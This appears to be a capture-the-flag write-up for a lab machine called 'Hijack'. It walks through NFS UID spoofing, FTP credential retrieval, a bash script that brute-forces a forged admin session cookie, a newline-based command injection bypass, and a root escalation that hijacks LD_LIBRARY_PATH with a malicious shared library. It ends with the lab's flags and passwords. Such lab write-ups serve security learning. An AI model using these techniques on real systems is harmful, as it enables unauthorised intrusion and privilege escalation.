# Hijack - CTF Writeup
*(solved using gemini 🤖🤖🤖)*

**Target IP:** 10.48.149.195
**Challenge Description:** 'Misconfigs conquered, identities claimed.'

## Reconnaissance

The engagement started with an initial Nmap scan to identify open ports and services on the target.

```bash
mkdir -p ~/Hijack
nmap -sC -sV -p- --min-rate 5000 10.48.149.195 -oN ~/Hijack/nmap_initial.txt
```

The scan revealed several open ports:
*   **21/tcp:** FTP (vsftpd 3.0.3)
*   **22/tcp:** SSH (OpenSSH 7.2p2)
*   **80/tcp:** HTTP (Apache httpd 2.4.18)
*   **111/tcp, 2049/tcp, etc.:** RPC and NFS services.

## Enumeration

### NFS
Since NFS was open, I checked the available exports:

```bash
showmount -e 10.48.149.195
```

This revealed a share at `/mnt/share`. I mounted it locally:

```bash
mkdir -p /tmp/hijack_mnt
sudo mount -t nfs 10.48.149.195:/mnt/share /tmp/hijack_mnt
```

The share had restrictive permissions (`drwx------` for UID 1003). I created a local user with UID 1003 to bypass this and list the contents:

```bash
sudo useradd -u 1003 mntuser
sudo -u mntuser ls -la /tmp/hijack_mnt
```

This revealed a file named `for_employees.txt`. I copied it locally:

```bash
sudo -u mntuser cp /tmp/hijack_mnt/for_employees.txt /tmp/
cp /tmp/for_employees.txt ~/Hijack/
```

Reading `for_employees.txt` provided FTP credentials:

```
ftp creds :
ftpuser:W3stV1rg1n14M0un741nM4m4
```

### FTP
I connected to the FTP server using the newly found credentials.

```bash
python3 -c "from ftplib import FTP; ftp = FTP('10.48.149.195'); ftp.login('ftpuser', 'W3stV1rg1n14M0un741nM4m4'); ftp.retrlines('LIST -al')"
```

Listing all files (including hidden ones) revealed several interesting files, including `.from_admin.txt` and `.passwords_list.txt`. I downloaded these files:

```bash
curl -s -u ftpuser:W3stV1rg1n14M0un741nM4m4 ftp://10.48.149.195/%2efrom_admin.txt -o ~/Hijack/from_admin.txt
curl -s -u ftpuser:W3stV1rg1n14M0un741nM4m4 ftp://10.48.149.195/%2epasswords_list.txt -o ~/Hijack/passwords_list.txt
```

`.from_admin.txt` indicated that the admin was using a password from the provided list. The list contained 150 passwords.

### Web Application
The web application on port 80 presented a home page with Login, Sign up, and Administration links. The Administration page was restricted to the `admin` user.

I created a test user (`user1`) and analyzed the session cookie (`PHPSESSID`).

```bash
curl -s -X POST -d "username=user1&password=user123&confirm_password=user123" http://10.48.149.195/signup.php -c /tmp/cookies.txt
cat /tmp/cookies.txt
```

The cookie value was `dXNlcjE6NmFkMTRiYTk5ODZlMzYxNTQyM2RmY2EyNTZkMDRlM2Y%3D`. URL decoding and Base64 decoding this revealed:
`user1:6ad14ba9986e3615423dfca256d04e3f`

The second part of the string `6ad14ba9986e3615423dfca256d04e3f` is the MD5 hash of the password `user123`. This meant the session cookie format was:
`base64(username:md5(password))`

## Exploitation

### Session Forgery & Admin Access
Knowing the cookie format and having a list of potential admin passwords, I wrote a bash script to iterate through the password list, forge a session cookie for the `admin` user, and test access to the `administration.php` page.

```bash
cat ~/Hijack/passwords_list.txt | while read p; do
    hash=$(echo -n "$p" | md5sum | cut -d' ' -f1)
    cookie=$(echo -n "admin:$hash" | base64 | tr -d '\n')
    res=$(curl -s -b "PHPSESSID=$cookie" http://10.48.149.195/administration.php)
    if [[ "$res" != *"Access denied"* ]]; then
        echo "Success! Password: $p"
        echo "Cookie: $cookie"
        break
    fi
done
```

This script successfully identified the admin password:
*   **Password:** `uDh3jCQsdcuLhjVkAy5x`
*   **Cookie:** `YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=`

### Command Injection
The `administration.php` page contained a "Services Status Checker". Testing this feature revealed it was vulnerable to command injection, although several characters were filtered (e.g., `;`, `&`, `|`).

I bypassed the filter by using URL-encoded newline injection (`%0A`).

```bash
curl -s -b "PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=" -X POST -d "service=apache2%0Aid&submit=" http://10.48.149.195/administration.php
```

The command executed successfully under the context of `www-data`.

### Lateral Movement to User 'rick'
I used the command injection vulnerability to read the source code of the web application, specifically `/var/www/html/config.php`.

```bash
curl -s -b "PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=" -X POST -d "service=apache2%0Acat%20/var/www/html/config.php&submit=" http://10.48.149.195/administration.php
```

This file revealed database credentials:
`$password = "N3v3rG0nn4G1v3Y0uUp";`

I tested this password against the SSH service for the users found on the system (`ftpuser` and `rick`). The password worked for the user `rick`.

```bash
sshpass -p 'N3v3rG0nn4G1v3Y0uUp' ssh -o StrictHostKeyChecking=no rick@10.48.149.195
```

Once logged in as `rick`, I retrieved the user flag:

```bash
cat /home/rick/user.txt
# THM{fdc8cd4cff2c19e0d1022e78481ddf36}
```

## Privilege Escalation

Checking `rick`'s sudo privileges revealed an interesting entry:

```bash
sudo -l
# Matching Defaults entries for rick on Hijack:
#     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_LIBRARY_PATH
# 
# User rick may run the following commands on Hijack:
#     (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

The `env_keep+=LD_LIBRARY_PATH` setting allows passing custom shared libraries when executing the allowed command as root. I used `ldd /usr/sbin/apache2` to identify a library to hijack (e.g., `libcrypt.so.1`).

I created a malicious C program that would execute a command when loaded:

```c
#include <stdio.h>
#include <stdlib.h> 
#include <unistd.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("cat /root/root.txt > /tmp/root_flag.txt");
}
```

I compiled this into a shared library named `libcrypt.so.1` in the `/tmp` directory:

```bash
gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/libcrypt.c -nostartfiles
```

Finally, I executed the allowed sudo command while setting the `LD_LIBRARY_PATH` to prioritize my malicious library in `/tmp`:

```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

The exploit executed successfully, copying the root flag to `/tmp/root_flag.txt`.

```bash
cat /tmp/root_flag.txt
# THM{b91ea3e8285157eaf173d88d0a73ed5a}
```

## Flags
*   **User Flag:** `THM{fdc8cd4cff2c19e0d1022e78481ddf36}`
*   **Root Flag:** `THM{b91ea3e8285157eaf173d88d0a73ed5a}`

```